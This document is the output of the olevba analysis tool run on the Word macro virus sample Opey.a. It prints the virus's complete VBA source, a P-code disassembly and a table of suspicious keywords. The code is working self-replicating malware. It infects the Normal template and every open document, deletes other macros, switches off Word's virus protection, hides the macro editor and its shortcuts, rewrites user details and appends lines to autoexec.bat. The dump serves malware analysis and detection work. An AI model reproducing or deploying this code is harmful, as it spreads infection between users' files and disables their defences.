olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO OPEY_3.bas 
in file: Virus.MSWord.Opey.a - OLE stream: 'Macros/VBA/OPEY_3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub greetings()
On Error Resume Next
autoexecfile$ = "c:\autoexec.bat"
hFile = FreeFile
line1$ = ""
If ((Month(Date) = 12) And (Day(Date) = 25)) Or ((Month(Date) = 1) And (Day(Date) = 1)) Then
line1$ = "echo MERRY CHRISTMASS AND A HAPPY NEW YEAR !!!"
End If
If (Month(Date) = 11) And (Day(Date) = 1) Then
line1$ = "echo HAPPY HALLOWEEN !!!"
End If
If (Month(Date) = 2) And (Day(Date) = 14) Then
line1$ = "echo HAPPY VALENTINES DAY !!!"
End If
If line1$ <> "" Then
Open autoexecfile$ For Append Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, line1$
Print #hFile, "echo from: OPEY A."
Print #hFile, "pause"
Close hFile
End If
End Sub


Sub OnlyYou()
On Error Resume Next
Call A_OPEY_03
NTInfected = False
For i = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
clan = NormalTemplate.VBProject.VBComponents(i).Name
If clan = "A_OPEY_03" Then NTInfected = True
If (clan <> "A_OPEY_03") And (clan <> "ThisDocument") Then Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
Next i
For Each opendoc In Documents
ODInfected = False
With opendoc
For j = opendoc.VBProject.VBComponents.Count To 1 Step -1
clan = opendoc.VBProject.VBComponents(j).Name
If clan = "A_OPEY_03" Then ODInfected = True
If (clan <> "A_OPEY_03") And (clan <> "ThisDocument") And (clan <> "Reference to Normal") Then Application.OrganizerDelete Source:=opendoc.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
Next j
If ODInfected = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=opendoc.FullName, Name:="A_OPEY_03", Object:=wdOrganizerObjectProjectItems
opendoc.SaveAs FileName:=opendoc.FullName
End If
End With
Next opendoc
If NTInfected = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="A_OPEY_03", Object:=wdOrganizerObjectProjectItems
NormalTemplate.Save
End If
Call greetings
End Sub


Sub A_OPEY_03()
On Error Resume Next
Application.UserName = "OPEY A."
Application.UserAddress = "CNNHS B'92 PHILIPPINES (CNSC)"
Application.UserInitials = "LOVE"
With Dialogs(wdDialogFileSummaryInfo)
.Author = "OPEY A."
.Title = "LOVE"
.Execute
End With
With Options
.ConfirmConversions = False
.VirusProtection = False
.SaveNormalPrompt = False
End With
With ActiveDocument
.ReadOnlyRecommended = False
End With
On Error Resume Next
CommandBars("Visual Basic").Visible = False
CommandBars("Visual Basic").Enabled = False
CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
CommandBars("Visual Basic").Protection = msoBarNoCustomize
CommandBars("Tools").Controls("Macro").Delete
CommandBars("Tools").Controls("Customize...").Delete
CustomizationContext = NormalTemplate
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
End Sub


Sub FileSave()
On Error Resume Next
Call OnlyYou
ActiveDocument.Save
End Sub


Sub FileClose()
On Error Resume Next
Call OnlyYou
If ActiveDocument.Saved = False Then ActiveDocument.Save
ActiveDocument.Close
End Sub


Sub FileExit()
On Error Resume Next
Call OnlyYou
If ActiveDocument.Saved = False Then ActiveDocument.Save
Application.Quit
End Sub


Sub FileNew()
On Error Resume Next
Dialogs(wdDialogFileNew).Show
newfile$ = 1
Call OnlyYou
End Sub


Sub AutoOpen()
On Error Resume Next
Call OnlyYou
End Sub
Sub AutoExec()
On Error Resume Next
Call OnlyYou
End Sub


Sub FileSaveAs()
On Error Resume Next
Call OnlyYou
Dialogs(wdDialogFileSaveAs).Show
End Sub


Sub FilePageSetup()
On Error Resume Next
Call OnlyYou
Dialogs(wdDialogFilePageSetup).Show
End Sub


Sub FilePrint()
On Error Resume Next
Call OnlyYou
Dialogs(wdDialogFilePrint).Show
End Sub


Sub FileOpen()
On Error Resume Next
Dialogs(wdDialogFileOpen).Show
Call OnlyYou
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Opey.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/OPEY_3 - 7295 bytes
' Line #0:
' 	FuncDefn (Sub greetings())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	St autoexecfile$ 
' Line #3:
' 	Ld Friend 
' 	St hFile 
' Line #4:
' 	LitStr 0x0000 ""
' 	St line1$ 
' Line #5:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0019 
' 	Eq 
' 	Paren 
' 	And 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #6:
' 	LitStr 0x002E "echo MERRY CHRISTMASS AND A HAPPY NEW YEAR !!!"
' 	St line1$ 
' Line #7:
' 	EndIfBlock 
' Line #8:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000B 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #9:
' 	LitStr 0x0018 "echo HAPPY HALLOWEEN !!!"
' 	St line1$ 
' Line #10:
' 	EndIfBlock 
' Line #11:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000E 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #12:
' 	LitStr 0x001D "echo HAPPY VALENTINES DAY !!!"
' 	St line1$ 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	Ld line1$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #15:
' 	Ld autoexecfile$ 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Append Access Write)
' Line #16:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #17:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld line1$ 
' 	PrintItemNL 
' Line #18:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "echo from: OPEY A."
' 	PrintItemNL 
' Line #19:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "pause"
' 	PrintItemNL 
' Line #20:
' 	Ld hFile 
' 	Close 0x0001 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	EndSub 
' Line #23:
' Line #24:
' Line #25:
' 	FuncDefn (Sub OnlyYou())
' Line #26:
' 	OnError (Resume Next) 
' Line #27:
' 	ArgsCall (Call) A_OPEY_03 0x0000 
' Line #28:
' 	LitVarSpecial (False)
' 	St NTInfected 
' Line #29:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #30:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St clan 
' Line #31:
' 	Ld clan 
' 	LitStr 0x0009 "A_OPEY_03"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NTInfected 
' 	EndIf 
' Line #32:
' 	Ld clan 
' 	LitStr 0x0009 "A_OPEY_03"
' 	Ne 
' 	Paren 
' 	Ld clan 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld clan 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' 	EndIf 
' Line #33:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #34:
' 	StartForVariable 
' 	Ld opendoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #35:
' 	LitVarSpecial (False)
' 	St ODInfected 
' Line #36:
' 	StartWithExpr 
' 	Ld opendoc 
' 	With 
' Line #37:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	Ld opendoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #38:
' 	Ld j 
' 	Ld opendoc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St clan 
' Line #39:
' 	Ld clan 
' 	LitStr 0x0009 "A_OPEY_03"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ODInfected 
' 	EndIf 
' Line #40:
' 	Ld clan 
' 	LitStr 0x0009 "A_OPEY_03"
' 	Ne 
' 	Paren 
' 	Ld clan 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld clan 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld opendoc 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld clan 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' 	EndIf 
' Line #41:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #42:
' 	Ld ODInfected 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #43:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld opendoc 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "A_OPEY_03"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #44:
' 	Ld opendoc 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld opendoc 
' 	ArgsMemCall SaveAs 0x0001 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	EndWith 
' Line #47:
' 	StartForVariable 
' 	Ld opendoc 
' 	EndForVariable 
' 	NextVar 
' Line #48:
' 	Ld NTInfected 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #49:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "A_OPEY_03"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #50:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	ArgsCall (Call) greetings 0x0000 
' Line #53:
' 	EndSub 
' Line #54:
' Line #55:
' Line #56:
' 	FuncDefn (Sub A_OPEY_03())
' Line #57:
' 	OnError (Resume Next) 
' Line #58:
' 	LitStr 0x0007 "OPEY A."
' 	Ld Application 
' 	MemSt UserName 
' Line #59:
' 	LitStr 0x001D "CNNHS B'92 PHILIPPINES (CNSC)"
' 	Ld Application 
' 	MemSt UserAddress 
' Line #60:
' 	LitStr 0x0004 "LOVE"
' 	Ld Application 
' 	MemSt UserInitials 
' Line #61:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #62:
' 	LitStr 0x0007 "OPEY A."
' 	MemStWith Author 
' Line #63:
' 	LitStr 0x0004 "LOVE"
' 	MemStWith Title 
' Line #64:
' 	ArgsMemCallWith Execute 0x0000 
' Line #65:
' 	EndWith 
' Line #66:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #67:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #68:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #69:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #70:
' 	EndWith 
' Line #71:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #72:
' 	LitVarSpecial (False)
' 	MemStWith ReadOnlyRecommended 
' Line #73:
' 	EndWith 
' Line #74:
' 	OnError (Resume Next) 
' Line #75:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Visible 
' Line #76:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #77:
' 	Ld msoBarNoChangeVisible 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #78:
' 	Ld msoBarNoCustomize 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #79:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #80:
' 	LitStr 0x000C "Customize..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #81:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #82:
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #83:
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #84:
' 	EndSub 
' Line #85:
' Line #86:
' Line #87:
' 	FuncDefn (Sub FileSave())
' Line #88:
' 	OnError (Resume Next) 
' Line #89:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #90:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #91:
' 	EndSub 
' Line #92:
' Line #93:
' Line #94:
' 	FuncDefn (Sub FileClose())
' Line #95:
' 	OnError (Resume Next) 
' Line #96:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #97:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #98:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #99:
' 	EndSub 
' Line #100:
' Line #101:
' Line #102:
' 	FuncDefn (Sub FileExit())
' Line #103:
' 	OnError (Resume Next) 
' Line #104:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #105:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #106:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #107:
' 	EndSub 
' Line #108:
' Line #109:
' Line #110:
' 	FuncDefn (Sub FileNew())
' Line #111:
' 	OnError (Resume Next) 
' Line #112:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #113:
' 	LitDI2 0x0001 
' 	St newfile$ 
' Line #114:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #115:
' 	EndSub 
' Line #116:
' Line #117:
' Line #118:
' 	FuncDefn (Sub AutoOpen())
' Line #119:
' 	OnError (Resume Next) 
' Line #120:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #121:
' 	EndSub 
' Line #122:
' 	FuncDefn (Sub AutoExec())
' Line #123:
' 	OnError (Resume Next) 
' Line #124:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #125:
' 	EndSub 
' Line #126:
' Line #127:
' Line #128:
' 	FuncDefn (Sub FileSaveAs())
' Line #129:
' 	OnError (Resume Next) 
' Line #130:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #131:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #132:
' 	EndSub 
' Line #133:
' Line #134:
' Line #135:
' 	FuncDefn (Sub FilePageSetup())
' Line #136:
' 	OnError (Resume Next) 
' Line #137:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #138:
' 	Ld wdDialogFilePageSetup 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #139:
' 	EndSub 
' Line #140:
' Line #141:
' Line #142:
' 	FuncDefn (Sub FilePrint())
' Line #143:
' 	OnError (Resume Next) 
' Line #144:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #145:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #146:
' 	EndSub 
' Line #147:
' Line #148:
' Line #149:
' 	FuncDefn (Sub FileOpen())
' Line #150:
' 	OnError (Resume Next) 
' Line #151:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #152:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #153:
' 	EndSub 
' Line #154:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

